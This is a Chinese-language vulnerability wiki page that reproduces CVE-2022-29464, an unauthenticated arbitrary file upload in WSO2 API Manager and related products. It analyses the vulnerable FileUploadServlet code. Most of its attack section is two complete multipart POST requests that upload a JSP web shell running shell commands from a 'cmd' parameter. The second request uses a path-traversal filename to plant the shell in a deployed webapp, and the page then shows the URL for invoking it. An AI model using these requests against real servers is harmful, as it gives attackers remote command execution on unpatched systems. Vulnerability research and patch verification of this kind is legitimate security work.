<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/WSO2/WSO2%20fileupload%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%20CVE-2022-29464/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>WSO2 fileupload 任意文件上传漏洞 CVE-2022-29464 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "WSO2 fileupload \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e CVE-2022-29464", url: "#_top", children: [
              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
              {title: "\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
              {title: "\u73af\u5883\u642d\u5efa", url: "#_3" },
              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_4" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../WSO2%20proxy%20SSRF%E6%BC%8F%E6%B4%9E%20WSO2-2019-0598/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../WSO2%20proxy%20SSRF%E6%BC%8F%E6%B4%9E%20WSO2-2019-0598/" class="btn btn-xs btn-link">
        WSO2 proxy SSRF漏洞 WSO2-2019-0598
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../WPS/WPS%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../WPS/WPS%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        WPS命令执行漏洞
      </a>
    </div>
    
  </div>

    

    <h1 id="wso2-fileupload-cve-2022-29464">WSO2 fileupload 任意文件上传漏洞 CVE-2022-29464<a class="headerlink" href="#wso2-fileupload-cve-2022-29464" title="Permanent link">&para;</a></h1>
<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<p>CVE-2022-29464 是 Orange Tsai发现的 WSO2 上的严重漏洞。该漏洞是一种未经身份验证的无限制任意文件上传，允许未经身份验证的攻击者通过上传恶意 JSP 文件在 WSO2 服务器上获得 RCE。</p>
<h2 id="_2">漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<p><a-checkbox checked>WSO2 API Manager 2.2.0 and above</a-checkbox></br></p>
<p><a-checkbox checked>WSO2 Identity Server 5.2.0 and above</a-checkbox></br></p>
<p><a-checkbox checked>WSO2 Identity Server Analytics 5.4.0, 5.4.1, 5.5.0, 5.6.0</a-checkbox></br></p>
<p><a-checkbox checked>WSO2 Identity Server as Key Manager 5.3.0 and above</a-checkbox></br></p>
<p><a-checkbox checked>WSO2 Enterprise Integrator 6.2.0 and above</a-checkbox></br></p>
<h2 id="_3">环境搭建<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<p><a href="https://github.com/wso2/product-apim/releases/download/v4.0.0/wso2am-4.0.0.zip">https://github.com/wso2/product-apim/releases/download/v4.0.0/wso2am-4.0.0.zip</a></p>
<p><a href="https://github.com/wso2/product-apim/archive/refs/tags/v4.0.0.zip">https://github.com/wso2/product-apim/archive/refs/tags/v4.0.0.zip</a></p>
<h2 id="_4">漏洞复现<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
<p>下载 releases 后进入 bin目录, 执行 api.manager.sh文件，并开启 debug 方便远程调试</p>
<p><img alt="img" src="../../../.vuepress/public/img/1650767358343-2616cdd3-9166-4445-ad9a-4ea0277e1736.png" /></p>
<p>打开 product-apim-4.0.0 ，下载依赖，连接Debug进行调试分析</p>
<p><img alt="img" src="../../../.vuepress/public/img/1650804508335-ad372814-53fb-4c65-bb31-6197790a97a5.png" /></p>
<p>运行后访问 localhost:9443 出现如下即搭建完成<img alt="img" src="../../../.vuepress/public/img/1650767529092-33b5d581-f964-4f82-a614-29584a71b160.png" /></p>
<p>在配置文件 identity.xml 中我们可以看到 路由 <code>/fileupload</code> 中不存在权限鉴定,  对应的 Servlet 为 FileUploadServlet</p>
<p><img alt="img" src="../../../.vuepress/public/img/1650801767796-769caf29-8c4c-4b39-940d-f8cdb15f089d.png" /></p>
<p>文件上传为POST请求，对应的处理方法为 <code>doPost (org.wso2.carbon.ui.transports.FileUploadServlet#doPost)</code></p>
<div class="highlight"><pre><span></span><code><span class="kd">protected</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">doPost</span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">request</span><span class="p">,</span>
<span class="w">                          </span><span class="n">HttpServletResponse</span><span class="w"> </span><span class="n">response</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">ServletException</span><span class="p">,</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span>

<span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="n">fileUploadExecutorManager</span><span class="p">.</span><span class="na">execute</span><span class="p">(</span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">response</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">msg</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;File upload failed &quot;</span><span class="p">;</span>
<span class="w">            </span><span class="n">log</span><span class="p">.</span><span class="na">error</span><span class="p">(</span><span class="n">msg</span><span class="p">,</span><span class="w"> </span><span class="n">e</span><span class="p">);</span>
<span class="w">            </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ServletException</span><span class="p">(</span><span class="n">e</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
</code></pre></div>
<p>继续向下，略过调用方法的过程</p>
<div class="highlight"><pre><span></span><code><span class="nl">execute</span><span class="p">:</span><span class="mi">55</span><span class="p">,</span><span class="w"> </span><span class="n">ToolsAnyFileUploadExecutor</span><span class="w"> </span><span class="p">(</span><span class="n">org</span><span class="p">.</span><span class="na">wso2</span><span class="p">.</span><span class="na">carbon</span><span class="p">.</span><span class="na">ui</span><span class="p">.</span><span class="na">transports</span><span class="p">.</span><span class="na">fileupload</span><span class="p">)</span>
<span class="nl">executeGeneric</span><span class="p">:</span><span class="mi">104</span><span class="p">,</span><span class="w"> </span><span class="n">AbstractFileUploadExecutor</span><span class="w"> </span><span class="p">(</span><span class="n">org</span><span class="p">.</span><span class="na">wso2</span><span class="p">.</span><span class="na">carbon</span><span class="p">.</span><span class="na">ui</span><span class="p">.</span><span class="na">transports</span><span class="p">.</span><span class="na">fileupload</span><span class="p">)</span>
<span class="nl">execute</span><span class="p">:</span><span class="mi">436</span><span class="p">,</span><span class="w"> </span><span class="n">FileUploadExecutorManager$CarbonXmlFileUploadExecHandler</span><span class="w"> </span><span class="p">(</span><span class="n">org</span><span class="p">.</span><span class="na">wso2</span><span class="p">.</span><span class="na">carbon</span><span class="p">.</span><span class="na">ui</span><span class="p">.</span><span class="na">transports</span><span class="p">.</span><span class="na">fileupload</span><span class="p">)</span>
<span class="nl">startExec</span><span class="p">:</span><span class="mi">320</span><span class="p">,</span><span class="w"> </span><span class="n">FileUploadExecutorManager$FileUploadExecutionHandlerManager</span><span class="w"> </span><span class="p">(</span><span class="n">org</span><span class="p">.</span><span class="na">wso2</span><span class="p">.</span><span class="na">carbon</span><span class="p">.</span><span class="na">ui</span><span class="p">.</span><span class="na">transports</span><span class="p">.</span><span class="na">fileupload</span><span class="p">)</span>
<span class="nl">execute</span><span class="p">:</span><span class="mi">127</span><span class="p">,</span><span class="w"> </span><span class="n">FileUploadExecutorManager</span><span class="w"> </span><span class="p">(</span><span class="n">org</span><span class="p">.</span><span class="na">wso2</span><span class="p">.</span><span class="na">carbon</span><span class="p">.</span><span class="na">ui</span><span class="p">.</span><span class="na">transports</span><span class="p">.</span><span class="na">fileupload</span><span class="p">)</span>
</code></pre></div>
<p><img alt="img" src="../../../.vuepress/public/img/1650801837586-39bf1075-e0d5-4932-a808-e7f0e397b164.png" /></p>
<p><img alt="img" src="../../../.vuepress/public/img/1650802004637-1ac012b2-2978-41cb-bf15-13c863457ee3.png" /></p>
<p>最后来到出现漏洞的位置 <code>org.wso2.carbon.ui.transports.fileupload.ToolsAnyFileUploadExecutor#execute</code></p>
<p>这里我们构造请求包，上传文件</p>
<div class="highlight"><pre><span></span><code><span class="n">POST</span><span class="w"> </span><span class="o">/</span><span class="n">fileupload</span><span class="o">/</span><span class="n">toolsAny</span><span class="w"> </span><span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
<span class="nl">Host</span><span class="p">:</span><span class="w"> </span><span class="n">localhost</span><span class="p">:</span><span class="mi">9443</span>
<span class="nl">Accept</span><span class="p">:</span><span class="w"> </span><span class="o">*/*</span>
<span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span><span class="w"> </span><span class="n">gzip</span><span class="p">,</span><span class="w"> </span><span class="n">deflate</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span><span class="w"> </span><span class="mi">729</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span><span class="w"> </span><span class="n">multipart</span><span class="o">/</span><span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span><span class="w"> </span><span class="n">boundary</span><span class="o">=</span><span class="mi">4</span><span class="n">ef9f369a86bfaadf5ec3177278d49c0</span>
<span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span><span class="w"> </span><span class="n">python</span><span class="o">-</span><span class="n">requests</span><span class="o">/</span><span class="mf">2.22.0</span>

<span class="o">--</span><span class="mi">4</span><span class="n">ef9f369a86bfaadf5ec3177278d49c0</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Disposition</span><span class="p">:</span><span class="w"> </span><span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span><span class="w"> </span><span class="n">name</span><span class="o">=</span><span class="s">&quot;1.jsp&quot;</span><span class="p">;</span><span class="w"> </span><span class="n">filename</span><span class="o">=</span><span class="s">&quot;1.jsp&quot;</span>

<span class="o">&lt;</span><span class="n">FORM</span><span class="o">&gt;</span>
<span class="w">    </span><span class="o">&lt;</span><span class="n">INPUT</span><span class="w"> </span><span class="n">name</span><span class="o">=</span><span class="err">&#39;</span><span class="n">cmd</span><span class="err">&#39;</span><span class="w"> </span><span class="n">type</span><span class="o">=</span><span class="n">text</span><span class="o">&gt;</span>
<span class="w">    </span><span class="o">&lt;</span><span class="n">INPUT</span><span class="w"> </span><span class="n">type</span><span class="o">=</span><span class="n">submit</span><span class="w"> </span><span class="n">value</span><span class="o">=</span><span class="err">&#39;</span><span class="n">Run</span><span class="err">&#39;</span><span class="o">&gt;</span>
<span class="o">&lt;/</span><span class="n">FORM</span><span class="o">&gt;</span>
<span class="o">&lt;%</span><span class="err">@</span><span class="w"> </span><span class="n">page</span><span class="w"> </span><span class="n">import</span><span class="o">=</span><span class="s">&quot;java.io.*&quot;</span><span class="w"> </span><span class="o">%&gt;</span>
<span class="w">    </span><span class="o">&lt;%</span>
<span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getParameter</span><span class="p">(</span><span class="s">&quot;cmd&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">output</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;&quot;</span><span class="p">;</span>
<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">cmd</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span>
<span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="n">Process</span><span class="w"> </span><span class="n">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span><span class="kc">null</span><span class="p">,</span><span class="kc">null</span><span class="p">);</span>
<span class="w">            </span><span class="n">BufferedReader</span><span class="w"> </span><span class="n">sI</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">BufferedReader</span><span class="p">(</span><span class="k">new</span>
<span class="n">InputStreamReader</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="na">getInputStream</span><span class="p">()));</span>
<span class="w">            </span><span class="k">while</span><span class="p">((</span><span class="n">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sI</span><span class="p">.</span><span class="na">readLine</span><span class="p">())</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">output</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">s</span><span class="o">+</span><span class="s">&quot;&lt;/br&gt;&quot;</span><span class="p">;</span><span class="w"> </span><span class="p">}</span>
<span class="w">        </span><span class="p">}</span><span class="w">  </span><span class="k">catch</span><span class="p">(</span><span class="n">IOException</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">   </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span><span class="w">   </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="o">%&gt;</span>
<span class="w">        </span><span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;%=</span><span class="n">output</span><span class="w"> </span><span class="o">%&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
<span class="o">--</span><span class="mi">4</span><span class="n">ef9f369a86bfaadf5ec3177278d49c0</span><span class="o">--</span>
</code></pre></div>
<p><img alt="img" src="../../../.vuepress/public/img/1650803224176-dbe2a392-a7b5-468a-bc6f-da381ffe0d49.png" /></p>
<p>上传时文件名为 1.jsp，成功上传目标会返回 uuid 值, 调试过程中我们可以发现文件被上传在某个目录下</p>
<p><img alt="img" src="../../../.vuepress/public/img/1650803654297-7c813794-2c58-4f63-aa8d-fac097a5bb90.png" /></p>
<div class="highlight"><pre><span></span><code><span class="x">public class ToolsAnyFileUploadExecutor extends AbstractFileUploadExecutor {</span>

<span class="x">    @Override</span>
<span class="x">    public boolean execute(HttpServletRequest request,</span>
<span class="x">            HttpServletResponse response) throws CarbonException, IOException {</span>
<span class="x">        PrintWriter out = response.getWriter();</span>
<span class="x">        try {</span>
<span class="x">            Map fileResourceMap =</span>
<span class="x">                (Map) configurationContext</span>
<span class="x">                        .getProperty(ServerConstants.FILE_RESOURCE_MAP);</span>
<span class="x">            if (fileResourceMap == null) {</span>
<span class="x">                fileResourceMap = new TreeBidiMap();</span>
<span class="x">                configurationContext.setProperty(ServerConstants.FILE_RESOURCE_MAP,</span>
<span class="x">                                             fileResourceMap);</span>
<span class="x">            }</span>
<span class="x">            List&lt;FileItemData&gt; fileItems = getAllFileItems();</span>
<span class="x">            //String filePaths = &quot;&quot;;</span>

<span class="x">            for (FileItemData fileItem : fileItems) {</span>
<span class="x">                String uuid = String.valueOf(</span>
<span class="x">                        System.currentTimeMillis() + Math.random());</span>
<span class="x">                String serviceUploadDir =</span>
<span class="x">                        configurationContext</span>
<span class="x">                                .getProperty(ServerConstants.WORK_DIR) +</span>
<span class="x">                                File.separator +</span>
<span class="x">                                &quot;extra&quot; + File</span>
<span class="x">                                .separator +</span>
<span class="x">                                uuid + File.separator;</span>
<span class="x">                File dir = new File(serviceUploadDir);</span>
<span class="x">                if (!dir.exists()) {</span>
<span class="x">                    dir.mkdirs();</span>
<span class="x">                }</span>
<span class="x">                File uploadedFile = new File(dir, fileItem.getFileItem().getFieldName());</span>
<span class="x">                try (FileOutputStream fileOutStream = new FileOutputStream(uploadedFile)) {</span>
<span class="x">                    fileItem.getDataHandler().writeTo(fileOutStream);</span>
<span class="x">                    fileOutStream.flush();</span>
<span class="x">                }</span>
<span class="x">                response.setContentType(&quot;text/plain; charset=utf-8&quot;);</span>
<span class="x">                //filePaths = filePaths + uploadedFile.getAbsolutePath() + &quot;,&quot;;</span>
<span class="x">                fileResourceMap.put(uuid, uploadedFile.getAbsolutePath());</span>
<span class="x">                out.write(uuid);</span>
<span class="x">            }</span>
<span class="x">            //filePaths = filePaths.substring(0, filePaths.length() - 1);</span>
<span class="x">            //out.write(filePaths);</span>
<span class="x">            out.flush();</span>
<span class="x">        } catch (Exception e) {</span>
<span class="x">            log.error(&quot;File upload FAILED&quot;, e);</span>
<span class="x">            out.write(&quot;&lt;script type=\&quot;text/javascript\&quot;&gt;&quot; +</span>
<span class="x">                    &quot;top.wso2.wsf.Util.alertWarning(&#39;File upload FAILED. File may be non-existent or invalid.&#39;);&quot; +</span>
<span class="x">                    &quot;&lt;/script&gt;&quot;);</span>
<span class="x">        } finally {</span>
<span class="x">            out.close();</span>
<span class="x">        }</span>
<span class="x">        return true;</span>
<span class="x">    }</span>

<span class="x">}</span>
</code></pre></div>
<p><img alt="img" src="../../../.vuepress/public/img/1650803736519-90e242b2-1478-4966-8bc5-5ef86402537c.png" /></p>
<p>但文件名是我们可控的，拼接的过程中我们通过控制文件名遍历目录，将文件上传到我们需要的位置,  查找可以解析 jsp文件的目录 </p>
<p><img alt="img" src="../../../.vuepress/public/img/1650803934233-733ce8ed-97da-4ece-acbf-c535d4704b34.png" /></p>
<p>构造请求包，通过控制文件名的方法上传至该目录中</p>
<div class="highlight"><pre><span></span><code><span class="n">POST</span><span class="w"> </span><span class="o">/</span><span class="n">fileupload</span><span class="o">/</span><span class="n">toolsAny</span><span class="w"> </span><span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
<span class="nl">Host</span><span class="p">:</span><span class="w"> </span><span class="n">localhost</span><span class="p">:</span><span class="mi">9443</span>
<span class="nl">Accept</span><span class="p">:</span><span class="w"> </span><span class="o">*/*</span>
<span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span><span class="w"> </span><span class="n">gzip</span><span class="p">,</span><span class="w"> </span><span class="n">deflate</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span><span class="w"> </span><span class="mi">729</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span><span class="w"> </span><span class="n">multipart</span><span class="o">/</span><span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span><span class="w"> </span><span class="n">boundary</span><span class="o">=</span><span class="mi">4</span><span class="n">ef9f369a86bfaadf5ec3177278d49c0</span>
<span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span><span class="w"> </span><span class="n">python</span><span class="o">-</span><span class="n">requests</span><span class="o">/</span><span class="mf">2.22.0</span>

<span class="o">--</span><span class="mi">4</span><span class="n">ef9f369a86bfaadf5ec3177278d49c0</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Disposition</span><span class="p">:</span><span class="w"> </span><span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span><span class="w"> </span><span class="n">name</span><span class="o">=</span><span class="s">&quot;../../../../repository/deployment/server/webapps/authenticationendpoint/1.jsp&quot;</span><span class="p">;</span><span class="w"> </span><span class="n">filename</span><span class="o">=</span><span class="s">&quot;../../../../repository/deployment/server/webapps/authenticationendpoint/1.jsp&quot;</span>

<span class="o">&lt;</span><span class="n">FORM</span><span class="o">&gt;</span>
<span class="w">    </span><span class="o">&lt;</span><span class="n">INPUT</span><span class="w"> </span><span class="n">name</span><span class="o">=</span><span class="err">&#39;</span><span class="n">cmd</span><span class="err">&#39;</span><span class="w"> </span><span class="n">type</span><span class="o">=</span><span class="n">text</span><span class="o">&gt;</span>
<span class="w">    </span><span class="o">&lt;</span><span class="n">INPUT</span><span class="w"> </span><span class="n">type</span><span class="o">=</span><span class="n">submit</span><span class="w"> </span><span class="n">value</span><span class="o">=</span><span class="err">&#39;</span><span class="n">Run</span><span class="err">&#39;</span><span class="o">&gt;</span>
<span class="o">&lt;/</span><span class="n">FORM</span><span class="o">&gt;</span>
<span class="o">&lt;%</span><span class="err">@</span><span class="w"> </span><span class="n">page</span><span class="w"> </span><span class="n">import</span><span class="o">=</span><span class="s">&quot;java.io.*&quot;</span><span class="w"> </span><span class="o">%&gt;</span>
<span class="w">    </span><span class="o">&lt;%</span>
<span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getParameter</span><span class="p">(</span><span class="s">&quot;cmd&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">output</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;&quot;</span><span class="p">;</span>
<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">cmd</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span>
<span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="n">Process</span><span class="w"> </span><span class="n">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span><span class="kc">null</span><span class="p">,</span><span class="kc">null</span><span class="p">);</span>
<span class="w">            </span><span class="n">BufferedReader</span><span class="w"> </span><span class="n">sI</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">BufferedReader</span><span class="p">(</span><span class="k">new</span>
<span class="n">InputStreamReader</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="na">getInputStream</span><span class="p">()));</span>
<span class="w">            </span><span class="k">while</span><span class="p">((</span><span class="n">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sI</span><span class="p">.</span><span class="na">readLine</span><span class="p">())</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">output</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">s</span><span class="o">+</span><span class="s">&quot;&lt;/br&gt;&quot;</span><span class="p">;</span><span class="w"> </span><span class="p">}</span>
<span class="w">        </span><span class="p">}</span><span class="w">  </span><span class="k">catch</span><span class="p">(</span><span class="n">IOException</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">   </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span><span class="w">   </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="o">%&gt;</span>
<span class="w">        </span><span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;%=</span><span class="n">output</span><span class="w"> </span><span class="o">%&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
<span class="o">--</span><span class="mi">4</span><span class="n">ef9f369a86bfaadf5ec3177278d49c0</span><span class="o">--</span>
</code></pre></div>
<p><img alt="img" src="../../../.vuepress/public/img/1650804126298-f5cf8a01-075b-4c27-889a-8ba2eb5664ab.png" /></p>
<p>访问上传的文件，<code>/authenticationendpoint/xxx.jsp?cmd=ls</code></p>
<p><img alt="img" src="../../../.vuepress/public/img/1650804305810-0c37ec79-0f9d-4eaa-9908-c223dca40471.png" /></p>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../WSO2%20proxy%20SSRF%E6%BC%8F%E6%B4%9E%20WSO2-2019-0598/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../WSO2%20proxy%20SSRF%E6%BC%8F%E6%B4%9E%20WSO2-2019-0598/" class="btn btn-xs btn-link">
        WSO2 proxy SSRF漏洞 WSO2-2019-0598
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../WPS/WPS%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../WPS/WPS%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        WPS命令执行漏洞
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>